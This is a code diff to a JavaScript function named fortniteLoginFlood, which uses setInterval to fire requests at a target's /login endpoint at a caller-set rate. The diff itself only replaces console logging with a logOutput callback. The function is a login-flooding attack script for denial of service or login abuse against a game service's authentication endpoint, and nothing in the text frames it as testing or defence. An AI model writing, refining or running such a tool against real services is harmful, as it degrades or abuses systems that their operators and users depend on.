@@ -1,6 +1,6 @@
 const request = require('request');
 
-function fortniteLoginFlood(target, rateLimit) {
+function fortniteLoginFlood(target, rateLimit, logOutput) {
     setInterval(() => {
         const options = {
             url: `https://${target}/login`,
@@ -13,9 +13,9 @@ function fortniteLoginFlood(target, rateLimit) {
 
         request(options, (error, response, body) => {
             if (error) {
-                console.error('Error: ' + error.message);
+                logOutput('Error: ' + error.message);
             } else {
-                console.log('Sent Fortnite login request');
+                logOutput('Sent Fortnite login request');
             }
         });
     }, 1000 / rateLimit);
